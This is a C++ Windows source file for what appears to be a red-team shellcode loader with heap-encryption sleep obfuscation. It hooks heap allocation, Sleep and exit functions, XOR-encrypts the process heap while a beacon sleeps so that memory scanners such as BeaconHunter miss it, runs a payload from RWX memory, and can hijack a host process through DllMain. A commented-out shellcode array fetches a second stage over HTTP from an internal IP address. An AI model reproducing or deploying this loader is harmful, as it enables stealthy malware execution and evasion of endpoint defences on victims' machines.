#include <windows.h>
#include <map>
#include <mutex>
#include <chrono>
#include <math.h>

#if defined(RELEASE_DLL) || defined(DEBUG_DLL)
#include <cctype>
#include <algorithm>
#include <psapi.h>
#include <intrin.h>
#pragma intrinsic(_ReturnAddress)
#endif

// Custom libs
#include "HookPatch.h"
#include "SuspendThreads.h"
#include "Encrypt.h"
#include "Payload.h"

// Globals to free
static void* sh;

// Encryption Key and Size
static const char key[4] = "ABC";
static size_t keySize = sizeof(key);

// ThreadIDs (These are used to identify what threads to hook)
static DWORD hookID = NULL;

// Initialize Mutexes for thread safety
static std::mutex runningAlready;
static std::recursive_mutex encryptMutex;
#if defined(RELEASE_DLL) || defined(DEBUG_DLL)
static std::recursive_mutex allocMutex;
static std::recursive_mutex reallocMutex;
static std::recursive_mutex freeMutex;
static BOOL runInsertion = TRUE;
static BOOL reRunInsertion = TRUE;
static BOOL runRemove = TRUE;

// User Assigned
std::string procNameHijack = "Dism";

// Set up some generic vars for our heap encryption.
static BOOL sleeping = FALSE; // This stops insertions when sleeping
struct Allocation { void* address; size_t size; }; // This is a struct of insertion information
static std::map<void*, Allocation> allocationsTable; // This is the map we insert into

// Start Hooks
static LPVOID(WINAPI* OldAlloc)(PVOID hHeap, ULONG dwFlags, SIZE_T dwBytes);
//Hooked Malloc
LPVOID  WINAPI HookedMalloc(PVOID hHeap, ULONG dwFlags, SIZE_T dwBytes) {
    LPVOID location = OldAlloc(hHeap, dwFlags, dwBytes);
    // This is for re-entrancy issues.  If a malloc occurs in the middle of our hook, this var becomes FALSE and the malloc only calls the real malloc and returns.
    // It is to prevent looping issues.
    if (runInsertion) {
        runInsertion = FALSE;
        if (sleeping == FALSE && hHeap == GetProcessHeap()) {
            DWORD callerID = GetCurrentThreadId();
            BOOL discovered = FALSE;
            // Here we check if the ThreadID calling this function matches the ThreadID we want to encrypt allocations for
            if (callerID == hookID) {
                std::lock_guard<std::recursive_mutex> lk(allocMutex);
                // Get the calling module using the _ReturnAddress() intrinsic function
                HMODULE hModule;
                char lpBaseName[256] = { 0 };
                //if ((LONG64)_ReturnAddress() == 0x00007FF9879303C1) {
                //2 NTDLL functions gave super weird errors.  If the return address contains these bytes we just know its ntdll so we do it ourselves.
                if (memcmp(_ReturnAddress(), "\x4c\x8b\xc0\x48\x85\xc0\x0f\x84", 8) == 0 || memcmp(_ReturnAddress(), "\x48\x8b\xd8\x48\x85\xc0\x0f\x84", 8) == 0) {
                    strcpy_s(lpBaseName, "ntdll.dll");
                }
                else {
                    LPCSTR data = (LPCSTR)_ReturnAddress();
                    if (::GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCSTR)_ReturnAddress(), &hModule) == 1) {
                        ::GetModuleBaseNameA(GetCurrentProcess(), hModule, lpBaseName, sizeof(lpBaseName));
                    }
                }
                std::string modName = lpBaseName;
                std::transform(modName.begin(), modName.end(), modName.begin(),
                    [](unsigned char c) { return std::tolower(c); });
                //if (modName.find("rpcrt4") == std::string::npos && modName.find("wininet") == std::string::npos) {
                //Only encrypt allocations made by non DLLs and this thread from the base exe
                //allocationsTable.insert(std::pair<void*, Allocation>(location, { location, dwBytes }));
                if (modName.find("dll") == std::string::npos || modName.find("exe") == std::string::npos) {
                    allocationsTable.insert(std::pair<void*, Allocation>(location, { location, dwBytes }));
                }
            }
        }
        runInsertion = TRUE;
    }
    return location;
}

static LPVOID(WINAPI* OldReAlloc)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
//Hooked ReAlloc
LPVOID WINAPI HookedReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes) {
    LPVOID reRelocation = OldReAlloc(hHeap, dwFlags, lpMem, dwBytes);
    // This is for re-entrancy issues.  If a malloc occurs in the middle of our hook, this var becomes FALSE and the malloc only calls the real malloc and returns.
    // It is to prevent looping issues.
    if (reRunInsertion) {
        reRunInsertion = FALSE;
        if (sleeping == FALSE && hHeap == GetProcessHeap()) {
            DWORD callerID = GetCurrentThreadId();
            BOOL discovered = FALSE;
            // Here we check if the ThreadID calling this function matches the ThreadID we want to encrypt allocations for
            if (callerID == hookID) {
                std::lock_guard<std::recursive_mutex> lk(reallocMutex);
                // Get the calling module using the _ReturnAddress() intrinsic function
                HMODULE hModule;
                char lpBaseName[256];
                //2 NTDLL functions gave super weird errors.  If the return address contains these bytes we just know its ntdll so we do it ourselves.
                if (memcmp(_ReturnAddress(), "\x4c\x8b\xc0\x48\x85\xc0\x0f\x84", 8) == 0 || memcmp(_ReturnAddress(), "\x48\x8b\xd8\x48\x85\xc0\x0f\x84", 8) == 0) {
                    strcpy_s(lpBaseName, "ntdll.dll");
                }
                else {
                    LPCSTR data = (LPCSTR)_ReturnAddress();
                    if (::GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCSTR)_ReturnAddress(), &hModule) == 1) {
                        ::GetModuleBaseNameA(GetCurrentProcess(), hModule, lpBaseName, sizeof(lpBaseName));
                    }
                }
                std::string modName = lpBaseName;
                std::transform(modName.begin(), modName.end(), modName.begin(),
                    [](unsigned char c) { return std::tolower(c); });
                //Only encrypt allocations made by non DLLs and this thread from the base exe
                //allocationsTable.insert(std::pair<void*, Allocation>(reRelocation, { reRelocation, dwBytes }));
                if (modName.find("dll") == std::string::npos || modName.find("exe") == std::string::npos) {
                    allocationsTable.insert(std::pair<void*, Allocation>(reRelocation, { reRelocation, dwBytes }));
                }
            }
        }
        reRunInsertion = TRUE;
    }
    
    return reRelocation;
}

static BOOL(WINAPI* OldFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
//Hooked Free
BOOL WINAPI HookedFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem) {
    BOOL completed = OldFree(hHeap, dwFlags, lpMem);

    // This is for re-entrancy issues.  If a malloc occurs in the middle of our hook, this var becomes FALSE and the malloc only calls the real malloc and returns.
    // It is to prevent looping issues.
    if (runRemove) {
        runRemove = FALSE;
        if (sleeping == FALSE) {
            DWORD callerID = GetCurrentThreadId();
            // Here we check if the ThreadID calling this function matches the ThreadID we want to encrypt allocations for
            if (callerID == hookID) {
                std::lock_guard<std::recursive_mutex> lk(freeMutex);
                std::map<void*, Allocation>::iterator it;
                it = allocationsTable.find(lpMem);
                if (it != allocationsTable.end()) {
                    allocationsTable.erase(it);
                }
            }
        }
        runRemove = TRUE;
    }
    
    return completed;
}

static void(WINAPI* OldExitThread)(DWORD dwExitCode);
//Hooked Sleep
void WINAPI HookedExitThread(DWORD dwExitCode) {
    DWORD callerID = GetCurrentThreadId();
    if (callerID == hookID) {
        DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());
        UndoPatches();
        DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());
        VirtualFreeEx(GetCurrentProcess(), (LPVOID)sh, 0, MEM_RELEASE);
        std::map<void*, Allocation>::iterator it;
        for (it = allocationsTable.begin(); it != allocationsTable.end(); ++it) {
            memset((LPVOID)it->first, 0x00, it->second.size);
        }
        ExitThread(dwExitCode);
    }
    else {
        OldExitThread(dwExitCode);
    }
}

static void(WINAPI* OldExitProcess)(DWORD dwExitCode);
//Hooked Sleep
void WINAPI HookedExitProcess(DWORD dwExitCode) {
    DWORD callerID = GetCurrentThreadId();
    if (callerID == hookID) {
        DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());
        UndoPatches(); //We cannot unload the DLL until we resolve this.  Unhooking ExitProcess causes Control Flow Guard errors.
        DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());
        VirtualFreeEx(GetCurrentProcess(), (LPVOID)sh, 0, MEM_RELEASE);
        std::map<void*, Allocation>::iterator it;
        for (it = allocationsTable.begin(); it != allocationsTable.end(); ++it) {
            memset((LPVOID)it->first, 0x00, it->second.size);
        }
        ExitThread(dwExitCode);
        //If the caller is the targeted thread then exit the thread only.
    }
    else {
        //OldExitProcess(dwExitCode);
        //This ensures our process keeps running forever.  Uncomment if you want to restore normal behavior.
    }
}
#endif

static PROCESS_HEAP_ENTRY entry;
// Basic encrypt function.  We basically walk the heap and if any allocation exists in our map we encrypt it.  We do this to make extra extra sure the region we are encrypting is allocated to prevent crashes.
BOOL HeapEncryptDecrypt() {
    std::lock_guard<std::recursive_mutex> lk(encryptMutex);
    SecureZeroMemory(&entry, sizeof(entry));
    HANDLE currentHeap = GetProcessHeap();
#if defined(RELEASE_DLL) || defined (DEBUG_DLL)
    while (HeapWalk(currentHeap, &entry)) {
        if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
            if (allocationsTable.count(entry.lpData) == 1) {
                xor_bidirectional_encode(key, keySize, (char*)(entry.lpData), entry.cbData);
            }
        }
    }
#endif
#if defined(RELEASE_EXE) || defined(DEBUG_EXE)
    while (HeapWalk(currentHeap, &entry)) {
        if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
            xor_bidirectional_encode(key, keySize, (char*)(entry.lpData), entry.cbData);
        }
    }
#endif
    return 0;
}

// Custom more accurate sleep to bypass BeaconHunter
// https://blat-blatnik.github.io/computerBear/making-accurate-sleep-function/
// https://github.com/3lp4tr0n/BeaconHunter
void timerSleep(double seconds) {
    using namespace std::chrono;

    static HANDLE timer = CreateWaitableTimer(NULL, FALSE, NULL);
    static double estimate = 5e-3;
    static double mean = 5e-3;
    static double m2 = 0;
    static int64_t count = 1;

    while (seconds - estimate > 1e-7) {
        double toWait = seconds - estimate;
        LARGE_INTEGER due;
        due.QuadPart = -int64_t(toWait * 1e7);
        auto start = high_resolution_clock::now();
        SetWaitableTimerEx(timer, &due, 0, NULL, NULL, NULL, 0);
        WaitForSingleObject(timer, INFINITE);
        auto end = high_resolution_clock::now();

        double observed = (end - start).count() / 1e9;
        seconds -= observed;

        ++count;
        double error = observed - toWait;
        double delta = error - mean;
        mean += delta / count;
        m2 += delta * (error - mean);
        double stddev = sqrt(m2 / (count - 1));
        estimate = mean + stddev;
    }

    // spin lock
    auto start = high_resolution_clock::now();
    while ((high_resolution_clock::now() - start).count() / 1e9 < seconds);
}

extern "C" int asmFunc(LPVOID, DWORD);
extern "C" void cryptor(LPVOID, LPVOID, DWORD, LPVOID, LPVOID, DWORD64);
extern "C" void gadgetFuncXor();
static void(WINAPI* OldSleep)(DWORD dwMiliseconds);
//Hooked Sleep
void WINAPI HookedSleep(DWORD dwMiliseconds) {
    //dwMiliseconds = 5000;
    DWORD callerID = GetCurrentThreadId();
#if defined(RELEASE_DLL) || defined (DEBUG_DLL)
    sleeping = TRUE;
#endif
    if (callerID == hookID && dwMiliseconds > 1000) {
#if defined(RELEASE_EXE) || defined (DEBUG_EXE)
        HeapLock(GetProcessHeap());
        DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());
        HeapEncryptDecrypt();

        OldSleep(dwMiliseconds);

        HeapEncryptDecrypt();
        HeapUnlock(GetProcessHeap());
        DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());
#else
        HeapEncryptDecrypt();

        //cryptor((LPVOID)gadgetFuncXor, (LPVOID)OldSleep, dwMiliseconds, (LPVOID)xor_bidirectional_encode, (LPVOID)sh, Pay_len);
        //timerSleep(dwMiliseconds / 1000);
        OldSleep(dwMiliseconds);

        HeapEncryptDecrypt();
#endif
    }
    else {
        //asmFunc((LPVOID)OldSleep, dwMiliseconds);
        //cryptor((LPVOID)gadgetFuncXor, (LPVOID)OldSleep, dwMiliseconds, (LPVOID)xor_bidirectional_encode, (LPVOID)sh, Pay_len);
        timerSleep(dwMiliseconds / 1000);
        //OldSleep(dwMiliseconds);
    }
#if defined(RELEASE_DLL) || defined (DEBUG_DLL)
    sleeping = FALSE;
#endif 
}

static int(WINAPI* OldMB)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
//Hooked Sleep
int WINAPI HookedMB(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
    return OldMB(hWnd, "HOOKED", lpCaption, uType);
}

#if defined(RELEASE_DLL)
__declspec(dllexport) void main()
#else
void main()
#endif
{
    std::lock_guard<std::mutex> lk(runningAlready);
    // We start by suspending threads so we can hook the required functions.
    DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());
#if defined(RELEASE_DLL) || defined (DEBUG_DLL)

    HookPatchTrampoline("ntdll.dll", "RtlAllocateHeap", (LPVOID)HookedMalloc, (FARPROC*)&OldAlloc, true);
    if (!OldAlloc) {
        MessageBoxA(NULL, "Hooking RtlAllocateHeap failed.", "Status", NULL);
    }
    
    HookPatchTrampoline("ntdll.dll", "RtlFreeHeap", (LPVOID)HookedFree, (FARPROC*)&OldFree, true);
    if (!OldFree) {
        MessageBoxA(NULL, "Hooking RtlFreeHeap failed.", "Status", NULL);
    }

    HookPatchTrampoline("ntdll.dll", "RtlReAllocateHeap", (LPVOID)HookedReAlloc, (FARPROC*)&OldReAlloc, true);
    if (!OldReAlloc) {
        MessageBoxA(NULL, "Hooking RtlReAllocateHeap failed.", "Status", NULL);
    }

    // Since we are injected into a thread, make sure to undo patches to cleanup before exiting.
    HookPatchTrampoline("kernel32.dll", "ExitThread", (LPVOID)HookedExitThread, (FARPROC*)&OldExitThread, false);
    if (!OldExitThread) {
        MessageBoxA(NULL, "Hooking ExitThread failed.", "Status", NULL);
    }

    // This exit too
    HookPatchTrampoline("kernel32.dll", "ExitProcess", (LPVOID)HookedExitProcess, (FARPROC*)&OldExitProcess, false);
    if (!OldExitProcess) {
        MessageBoxA(NULL, "Hooking ExitProcess failed.", "Status", NULL);
    }
#endif
    HookPatchTrampoline("kernel32.dll", "Sleep", (LPVOID)HookedSleep, (FARPROC*)&OldSleep, false);
    if (!OldSleep) {
        MessageBoxA(NULL, "Hooking Sleep failed.", "Status", NULL);
    }

    /*MessageBoxA(NULL, "NOT HOOKED", "NOT HOOKED", NULL);
    HookPatchTrampoline("user32.dll", "MessageBoxA", (LPVOID)HookedMB, (FARPROC*)&OldMB, false);
    if (!OldMB) {
        MessageBoxA(NULL, "Hooking MessageBoxA failed.", "Status", NULL);
    }*/
    // Resume all threads upon completion of hooking
    DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());
    MessageBoxA(NULL, "NOT HOOKED", "NOT HOOKED", NULL);

    //Staged Shellcode goes below.  Unstaged should go in Payload.h
    //static unsigned char dll[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x61\x70\x69\x2f\x76\x37\x2f\x74\x68\x72\x65\x61\x74\x73\x69\x6d\x73\x2f\x78\x36\x34\x2f\x73\x74\x61\x72\x74\x3f\x75\x75\x69\x64\x3d\x66\x6a\x32\x38\x39\x66\x6d\x31\x2d\x30\x61\x73\x64\x66\x61\x73\x62\x2d\x34\x39\x61\x73\x64\x66\x65\x2d\x61\x33\x32\x33\x34\x62\x2d\x34\x66\x36\x32\x61\x73\x64\x66\x33\x36\x39\x31\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x33\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b\x20\x72\x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x0d\x0a\x00\x82\xeb\xd6\x38\xb1\xeb\xa3\xb1\xc6\xad\x0f\x09\xe7\xf8\x18\x97\x06\x6d\xb2\x9a\x13\x0f\x9b\x74\x13\x07\xd6\x10\x2e\x66\xda\x90\xc1\x8a\xe8\x4a\xaf\x55\x4d\x7b\xa4\xf2\x52\xe9\x8c\x7b\x06\x28\xfe\x89\xae\xbd\x2e\x13\xfc\xd6\xcc\x3b\xaf\x9f\xe0\x74\x37\x5b\x5e\xc1\xe1\xc0\x8a\xdd\xae\xc7\x06\x3a\x81\xc9\xee\x27\x3d\x10\x5f\x87\xc3\x85\xae\xa6\xc0\xd0\x60\xca\x00\x75\x94\x4c\xfa\x26\xb1\x13\xd6\x26\xf8\x27\x61\x8e\x69\x12\x86\x00\x76\x21\x42\x16\xaa\x0f\x5e\xb4\x71\xef\x57\x65\x0c\x2b\xd7\x56\x82\x6e\x3d\x6d\x93\xa7\x1a\x3c\xe9\xa2\x56\x56\xfe\x53\x63\xd8\x19\xcf\xa0\x46\xd5\x09\x80\x29\x9a\xe4\x9f\xcf\x0d\x5e\xce\x91\xf7\xa7\xf0\xef\xe7\xe2\x5e\xb2\x35\x4d\xd4\xef\xfe\xd6\xc7\xaf\x72\x3a\x66\x03\xdd\x9c\xd2\x6f\xbc\xa6\x09\xee\xba\x40\x96\xd7\xc7\xb2\x77\x5e\x32\x17\xce\x77\x5b\x78\xbe\x58\x9d\xaa\x36\xd4\x05\x40\xd8\x9d\xed\xe5\xd5\x88\x42\x83\x0d\xfa\xe0\xdd\xbb\x09\xe5\x53\x24\xa4\x78\x15\x62\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x38\x32\x00\x51\x09\xbf\x6d";
    //static size_t size = 892;// 892;
    static HANDLE hproc = GetCurrentProcess();
    static size_t bytesWritten = 0;
    static DWORD oldProtect = 0;
    sh = VirtualAllocEx(hproc, 0, (SIZE_T)Pay_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hproc, sh, Pay_dll, Pay_len, &bytesWritten);
    //VirtualProtectEx(hproc, sh, Pay_len, PAGE_EXECUTE_READ, &oldProtect);
#if defined(RELEASE_EXE) || defined(DEBUG_EXE) || defined(DEBUG_DLL)
    HANDLE threadToResume = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sh, NULL, CREATE_SUSPENDED, &hookID);
    ResumeThread(threadToResume);
    while (TRUE);
#endif
#ifdef RELEASE_DLL
    TCHAR szFileName[MAX_PATH];
    GetModuleFileName(NULL, szFileName, MAX_PATH);
    std::string fileName = szFileName;
    if (fileName.find("rundll32") != std::string::npos || fileName.find(procNameHijack) != std::string::npos) {
        hookID = GetCurrentThreadId();
        ((void(*)())sh)();
    }
    else {
        HANDLE threadToResume = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sh, NULL, CREATE_SUSPENDED, &hookID);
        ResumeThread(threadToResume);
    }
#endif
}

#if defined(RELEASE_DLL)
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved)  // reserved
{
    // Perform actions based on the reason for calling.
    TCHAR szFileName[MAX_PATH];
    GetModuleFileName(NULL, szFileName, MAX_PATH);
    std::string fileName = szFileName;
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Initialize once for each new process.
        // Return FALSE to fail DLL load.
        if (fileName.find("rundll32") == std::string::npos) {
            main();
        }
        break;

    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;

    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;

    case DLL_PROCESS_DETACH:
        // Perform any necessary cleanup.
        break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
#endif